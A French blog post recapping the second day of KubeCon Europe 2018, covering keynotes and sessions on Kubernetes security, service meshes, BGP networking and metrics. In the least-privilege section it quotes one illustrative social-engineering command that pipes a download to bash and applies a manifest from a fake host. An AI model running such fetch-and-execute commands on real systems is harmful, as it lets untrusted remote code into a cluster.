---
title: Récap du deuxième jour de Kubecon Europe 2018
authors:
  - zwindler
type: post
date: 2018-05-07T14:00:58+00:00
url: /2018/05/07/recap-du-deuxieme-jour-de-kubecon-europe-2018/
image: /2018/05/20180502_114733_HDR-1.jpg
categories:
  - Divers
tags:
  - aws
  - azure
  - Bellacenter
  - Copenhague
  - CoreOS
  - Financial Times
  - GCP
  - GKE
  - Kubecon
  - KubeCon Europe
  - KubeCon2018
  - Kubernetes
  - linkerd
  - operator
  - prometheus
  - Spotify
  - Tectonic

---
## Deuxième jour de Kubecon

Depuis mardi soir, j’étais à Copenhague pour assister à la KubeCon + CloudNativeCon Europe 2018. Si vous n’avez pas lu mon résumé de la journée de mercredi, [je vous propose d’aller le lire ici !][1]

Comme la veille, la journée a commencée par des Keynotes animées par Liz Rice & Kelsey Hightower.

Attention : j’ai trouvé qu’il y avait un peu de bourrage de crâne de la part des sponsors, vous risquez de me voir râler un peu ;-)

### Kubernetes Project Update

[_Keynote: Kubernetes Project Update - Aparna Sinha, Group Product Manager, Kubernetes and Google Kubernetes Engine, Google_][2]

Dans le même style de la keynote de Liz Rice sur les évolutions dans les projets de la CNCF, cette Keynote a été l’occasion de revenir sur les fonctionnalités qui sont apparues dans les versions 1.8, 1.9 et plus récemment 1.10.

Forcément, en 3 releases, le nombre de fonctionnalités sur un projet de cette ampleur est forcément impressionnant. On peut noter l’ajout des **Cronjobs**, du support du **Machine Learning**, du fait Kubernetes peut agir en tant qu’orchestrateur pour des **workload Spark et l’operator Spark** (ceci à d’ailleurs fait l’objet d’une démo en live dans laquelle ont été comptés les mots dans l’oeuvre de shakespeare).

Sur l’aspect sécurité, Aparna Sinha a lourdement insisté [sur gvisor que Google a open sourcé][3] dans le cadre de la conférence (micro kernel en userland permettant de ne pas exécuter les containers directement sur le kernel de l’hôte). On en a déjà eu une couche hier, et des confs étaient prévues dans la journée...

Des progrès ont également été fait avec l’introduction de la **CSI (container storage interface)**, qui, comme la **CNI** a pour but d’uniformiser la gestion du stockage via des extensions dans Kubernetes.

Et Mme Google d’en remettre une couche pour dire à quel point ils sont sympa d’avoir open sourcé un bout de code dans Prometheus pour permettre à vos Prometheus _on premise_ de streamer les data vers le cloud (Google Cloud au hasard ?). Pour vous faciliter la vie et avoir tout dans un même endroit bien sûr ;).

### Accelerating Kubernetes Native Applications

[_Keynote: Accelerating Kubernetes Native Applications - Brandon Philips, CTO of CoreOS, Red Hat_][4]

Brandon Philips de CoreOS (racheté depuis peu par RedHat) est venu nous parler des Operators, ou comment étendre Kubernetes de manière propre. CoreOS est depuis longtemps impliquée dans le développement d’extensions de Kubernetes, notamment parce Tectonic en proposait 2 (les operators etcd & prometheus).

Concrètement, on étend l’API de Kubernetes en créant de nouveaux objets logiques, ce qui nous permet de piloter des logiciels tiers comme s’ils faisaient partie du cluster.

Pour continuer dans cette veine, CoreOS a mis à disposition un Framework, « l’Operator framework », dont le but est de faciliter la création des operators par des sociétés/projets tiers.

Bel effort, il faudra voir si ça prend ou pas.

### REX du Financial times

[_Keynote: Switching Horses Midstream: The Challenges of Migrating 150+ Microservices to Kubernetes - Sarah Wells, Technical Director for Operations and Reliability, Financial Times_][5]

Un REX très agréable et très bien présenté par Sarah Wells. Le Financial Times, comme beaucoup de compagnies, fait de l’IT de pointe, non pas parce que c’est son coeur de métier, mais par nécessité.

Quand ils sont passés sous Docker en 2015, le moins que l’on puisse dire c’est que la peinture n’était pas encore complètement fraîche, et une solution maison a du être montée pour répondre aux besoins. Et quand courant 2016, l’ensemble de la core-team qui a passé la production sous Docker est partie d’un coup, il a fallu faire face et trouver une solution.

> Choose boring technology

Fin 2016, les équipes en places ont donc considérés les alternatives, ont décidés que Kubernetes étaient le leader émergents avec le plus de chances de devenir le standard de facto (bien vu) et banco.

Enfin, banco, c’est vite dit !

Une grosse partie de la Keynote a justement gravité autour du fait qu’il n’est pas si facile de migrer des centaines de microservices en production d’une solution maison basée sur Docker à un orchestrator comme Kubernetes !

Quelques questions/réflexions qu’ils ont du se poser. J’en ai noté quelques unes :

> How do you work in parallel (separate branches or if/else in code) ?  
> Separate deployment mechanisms vs a single one ?  
> On which branch must I do the testing ?  
> Making sure a service will recover if k8s moves it elsewhere  
> It’s easy to get sucked into making things better

### Shaping the cloud native future

_Keynote: Shaping the Cloud Native Future - Abby Kearns, Executive Director, Cloud Foundry Foundation_

Sincèrement, je n’ai pas compris le message. J’ai juste noté ça :

> Cloud native  
> Cloud everything  
> Interoperability & Velocity & Innovation  
> On peut faire tout ça avec Cloud Foundry et l’armée de l’air des états unis économise plein d’argent grâce à nous

**Next.**

### Skip the Anxiety Attack - Build Secure Apps with Kubernetes

_Keynote: Skip the Anxiety Attack - Build Secure Apps with Kubernetes - Jason McGee, Fellow, IBM_

> Kubernetes est un composant majeur pour vos cloud native apps, qui s’intègre nativement dans les processus de types CI/CD, offre une infrastructure flexible, permet de gérer la sécurité...
> 
> En plus de ça dans notre super cloud on peut ajouter traquer les vulnérabilités de vos containers, on a du TXT intel et du istio.io, blablabla

**Next.**

### Software’s community

_Keynote: Software’s Community - Dave Zolotusky, Software Engineer, Spotify_

On sort un peu du marketing mal déguisé et on repasse sur un REX, celui de Spotify !

Plutôt que de faire encore un talk sur leur migration vers K8s et les problèmes qu’ils ont rencontrés, Dave Zolotusky a préféré faire un talk sur ce que leur a apporté la communauté open source et pourquoi il faut contribuer.

Concrètement, Dave venait du monde _closed source_, avec des supports payant pour chacun des progiciels en production.

Depuis qu’il est chez Spotify et leur migration vers K8s et l’écosystèmes opensource qui gravite autour, à chaque fois qu’ils ont rencontrés un problème complexe, ils se sont tournés vers la communauté et à leur plus grande surprise, ont trouvé rapidement quelqu’un pour les aider.

Que ce soit faire des **Ingress cross namespaces** ou les problèmes qu’ils ont pu rencontrer en les configurant, ou encore quand ils ont configurés leurs Prometheus, il y avait toujours un dev sur Slack ou un pair de la CNCF pour leur répondre.

Certes, ce talk est un peu _bateau_ dans une conf autour de projets open sources, mais ça fait toujours du bien à entendre, surtout venant d’une société (1) relativement connue, (2) dont ce n’est pas le cœur de métier.

> We are all facing the same problems. And even if you’re THAT guy that has a problem no one else has, please share it. Others may look up to you when they’ll face the same problem later.

## Et c’est reparti pour le multi-track

### Applying least privileges through Kubernetes admission controllers

[_Applying Least Privileges through Kubernetes Admission Controllers - Benjy Portnoy, Aqua Security_][6]

Benjy Portnoy a fait quelques rappels de sécurités sur tout bon cluster Kubernetes.

Même si les recommandation sont un peu « obvious », ça fait toujours du bien de rappeler pourquoi il faut le faire (et le faire ;p).

Privilèges minimum pour tous les utilisateurs, autant sur les objets (limiter à des types d’objets, mais limiter aussi les actions qui peuvent être faites sur cet objet). Ça permet de limiter l’impact de l’erreur humaine ou de l’attaque de type social engineering du type :

```
curl | bash // kubectl create -f http://fakeapp.example.org.yaml
```

Benjy a rapidement rappelé qu’il existe un certain nombre de bonnes pratiques qui sont tout simplement décrites dans la documentation officielle de Kubernetes : authentification RBAC, segmentation des réseaux, **PodSecurityPolicy**, chiffrement des Secrets, enregistrement de tout ce qui se passe sur le cluster à des fins d’audit, ...

Mais le focus du talk a surtout été l’utilisation des **AdmissionControllers**, avec plusieurs exemples :

  * Allways pull images
  * Deny escalating exec
  * Pod security policy
  * Node restriction
  * Resource quota

Les possibilités de sécurisations sont infinies et ça nécessite d’y passer du temps car ce n’est pas « built-in » ;-).

Pour finir, Benjy a listé quelques outils permettant d’auditer soit même son cluster ou ses pods. A tester !

  * [Kube-bench][7]
  * kubehunter (pas encore public)
  * [kubesec.io][8]
  * [Microscanner](https://web.archive.org/web/20210804215839/https://blog.aquasec.com/microscanner-free-image-vulnerability-scanner-for-developers) (ajouter 2 lignes dans tous les Dockerfiles pour avoir un retour sur la sécurité des images sous-jacentes)

### Kubevisor

J’avais prévu d’aller voir « [**Understanding Distributed Consensus in etcd and Kubernetes**][10]« , mais, joie des confs multitrack, il n’y avait plus de place dans l’amphi et je me suis fait refouler ! Dommage, j’avais vraiment envie de mieux comprendre **etcd**, qui pour beaucoup est une bonne grosse boite noire, ce qui est gênant vu le rôle central qu’il joue dans K8s... Je suis donc allé dans l’amphi d’à côté pour voir :

_[Pod Anomaly Detection and Eviction using Prometheus Metrics - David Benque & Cedric Lamoriniere, Amadeus][11]_

Deux personnes de chez Amadeus (avec un accent bien Français ;p) nous ont présentés les problématiques posées par le loadbalancing d’applications fortement dépendantes les unes des autres.

Le pitch du talk était qu’un loadbalancing basique ne permet pas, dans ce genre de cas, d’éviter un effet papillon (un noeud défectueux provoque une panne en cascade). Pour améliorer leur stabilité, les ingénieurs chez Amadeus ont donc recours aux techniques suivantes :

Pour toutes les commnucations inter-microservices, l’utilisation d’un service mesh (Linkerd, istio.io), permettant un loadbalancing plus intelligent, avec des circuit breaker avec du routage intelligent et des fonctionnalités de type open/close/half-open en cas de défaillance.

Pour limiter l’impact d’une panne, ce service mesh leur permet aussi de prendre des décisions en fonction de signaux techniques (consommation mémoire, nombre de connexions).

Cependant, les produits existants ne répondaient toujours pas à l’ensemble de leur problématiques, et ils ont donc  présenté **Kubevisor**, une solution de détection d’anomalies dans les **Pods**, qui permet entre autre de gérer directement dans Kubernetes des notions de « circuit breaking » par application et avec des règles complet (une partie breaker, une partie activator) via des CRD (custom resources definitions).

### 101 ways to Break and Recover Kubernetes Clusters

[101 Ways to “Break and Recover” Kubernetes Cluster - Suresh Visvanathan & Nandhakumar Venkatachalam, Oath (Yahoo) ][12]

Deux personnes de chez Oath (Ex Yahoo) nous ont fait une liste à la Prévert de tous les problèmes qu’ils ont rencontré en production, et les mécanismes qu’ils ont mis en place pour éviter que ça se reproduise.

Si l’intention était bonne, la présentation était très rapide et un peu décousue (trop de cas, on passait trop rapidement d’une slide à l’autre).

Quelques cas qui ont retenu mon attention :

  * Un ingénieur qui exécute « **kubectl delete -f /dir** » et qui supprime par erreur un namespace. Un des méthoes pour éviter ça est d’utiliser un **Admission controller** pour interdire la suppression d’un namespace s’il reste des objets dedans.
  * Deux **Ingress** déclarent le même alias (on se retrouve donc avec un genre de loadbalancing chelou qui bascule une requête sur deux sur des services qui n’ont rien à voir). Là encore, le plus simple est d’utiliser un **Admission controller** pour éviter que ça n’arrive.
  * Suite à un bug sur les cgroup, tous les nœuds sont passés « Not ready » (alors que les pods fonctionnaient toujours) et ont supprimé tous les pods (eviction queue). Il existe un « Partial Disruption mode », qui permet d’éviter de tout supprimer alors que les nodes ?

### Digital ocean

[_Global Container Networks on Kubernetes at DigitalOcean - Andrew Sy Kim, DigitalOcean _][13]

Un talk bien costaud sur la façon dont Digital Ocean utilise **_BGP_ **comme couche d’abstraction réseau pour Kubernetes.

> Wait... what ?

Au début, j’étais un peu sceptique aussi. Leur problème initial était que dans leur cas, les abstractions de réseau existantes étaient :

  * trop lentes pour certaines applications (overhead, latence)
  * Le NAT/masquerading des IPs des pods empêche les développeurs de connaitre 
      * dans le pod, l’adresse de la source
      * depuis un client, l’adresse IP du pod qui a répondu

Au final, l’utilisation de BGP (pas détourné, mais peu commun on va dire) pour fournir un plan d’adressage global, aussi bien pour leurs serveurs physiques que pour leurs pods dans **tous leurs DCs** permet à Digital Océan d’avoir un réseau virtuel performance et d’avoir une IP accessible de manière globale pour chaque pod.

Au delà de la partie peering des équipements et des serveurs dans le DC (intéressant), il existe une implémentation de BGP pour Kuernetes ([Kube-router][14]) qui support eBGP/iBGP, le peering automatique BGP pour les services et les pods.

![](/2018/05/kuberouter.png)

Cerise sur le gâteau, ils se sont rendu compte après coup qu’avec cette implémentation du réseau ils pouvaient (via des External IPs) rendre directement accessible sur Internet des pods, en fonction de l’endroit où vous êtes sur le globe et via la même IP.

2ème cerise sur le gâteau, ils ont simplifié grandement leur gestion du DNS, en ajoutant une délégation pour que tous les services Kubernetes (de type monservice.monnamespace.cluster.local) puissent être résolus et accessibles depuis le réseau Digital Ocean, **même en dehors de Kubernetes**.

### Linkerd

[_Linkerd Intro – Andrew Siegner & George Miranda, Buoyant.io_ ][16]

Un démonstaction en live de Linkerd (service mesh), focalisée sur la partie loadbalancing / circuit breaker.

C’est simple, ça marche super bien, mais j’ai été vachement refroidi par le présentateur quand quelqu’un lui a demandé quels étaient les avantages de Linkerd par rapport aux autres solutions a dit :

> Linkerd, c’est puissant et stable, mais ça consomme beaucoup de ressources (1Go de RAM). On est en train de réécrire complètement le produit (Conduit). Si vous avez besoin d’un service mesh vraiment aujourd’hui et en production, Linkerd est super. Mais sinon, dans 2 mois on sort une version stable de Conduit. Le mieux, c’est d’attendre Conduit.

J’étais un peu sidéré... mais mes collègues m’ont confirmé que je n’avais pas rêvé.

### Reveal your deepes metrics

[_Reveal Your Deepest Kubernetes Metrics - Bob Cotton, Freshtracks.io_][17]

Un talk très sympa par Bob Cotton de Freshtracks.io. Je ne sais pas si c’était volontaire ou pas, mais il n’a pas du tout parlé de sa société (startup dans le monitoring K8s et prometheus, co-fondateur) et est rentré directement dans le vif du sujet : les métriques. On a vraiment senti que c’était un passionné par ce sujet, c’était très fluide malgré une masse d’information conséquente.

Comment déterminer quelles métriques sont importantes ?

Je ne savais pas que ça existait, mais il existe des méthodes pour classifier les métriques pour mesurer l’état de santé d’un service ou d’un cluster :

  * Four golden signals (Latency / Errors / Traffic / Saturation)
  * USE method  (Utilization / Saturation / Errors) réservée aux composants physiques (machine virtuelle) ou fonctionnels (serveur Apache)
  * RED method (Rate / Errors / Duration) pour les applications

> USE is for Resources  
> RED is for Services

Je ne vais pas tout détailler ici car c’était très dense, mais le support est à lire si vous devez mettre en place une solution de supervision pour votre application (quelle soit hébergée sur Kubernetes ou pas d’ailleurs).

## Et pour finir la journée ?

Pour ne pas nous assommer de Keynotes à nouveau, les organisateurs de la Kubecon avaient prévu une « soirée » à Tivoli Gardens. C’est un genre de parc d’attractions / fête foraine permanente en plein centre de Copenhague.

L’occasion de réseauter pour les plus studieux, ou juste de faire quelques manèges. C’était très sympa ;)

![](/2018/05/20180503_183546-2.jpg)


![](/2018/05/20180503_185350_HDR.jpg)


## Et vendredi ?

Il ne vous aura pas échappé que la Kubecon dure 3 jours. Malheureusement pour moi... mes amis gréviste de chez Air France ont décidé pour moi que je ne participerai pas au vendredi, en annulant mon Copenhague Paris et en me proposant comme seule et unique solution de passer ma journée de les aéroports (Zurich et Charles de Gaulle notamment).

Un peu dégoûté mais bon... C’est la vie ;-)


 [1]: /2018/05/03/recap-du-premier-jour-de-kubecon-europe-2018/
 [2]: https://schd.ws/hosted_files/kccnceu18/b5/Kubernetes%20Project%20Update.pdf
 [3]: https://github.com/google/gvisor
 [4]: https://schd.ws/hosted_files/kccnceu18/49/BRANDON%20PHILIPS.pdf
 [5]: https://schd.ws/hosted_files/kccnceu18/97/SARAH%20KubeconEurope2018_final.pdf
 [6]: https://kccnceu18.sched.com/event/EgBG/applying-least-privileges-through-kubernetes-admission-controllers-benjy-portnoy-aqua-security-intermediate-skill-level
 [7]: https://github.com/aquasecurity/kube-bench
 [8]: https://kubesec.io/
 [10]: https://kccnceu18.sched.com/event/Dqus/understanding-distributed-consensus-in-etcd-and-kubernetes-laura-frank-codeship-intermediate-skill-level
 [11]: https://schd.ws/hosted_files/kccnceu18/e8/%5Bkubecon%5D%5BKopenhagen-2018%5D%20Kubervisor.pdf
 [12]: https://schd.ws/hosted_files/kccnceu18/b2/%E2%80%9CBreak%20and%20Recover%E2%80%9D%20Kubernetes%20Cluster%20and%20Application.pdf
 [13]: https://schd.ws/hosted_files/kccnceu18/15/Global%20Container%20Networks%20-%20KubeCON%20EU%202018.pdf
 [14]: https://github.com/cloudnativelabs/kube-router
 [16]: https://schd.ws/hosted_files/kccnceu18/4e/Linkerd%20Intro.pdf
 [17]: https://schd.ws/hosted_files/kccnceu18/11/20180503%20KubeCon%20EU%20-%20Kubernetes%20Metrics%20Deep%20Dive.pdf
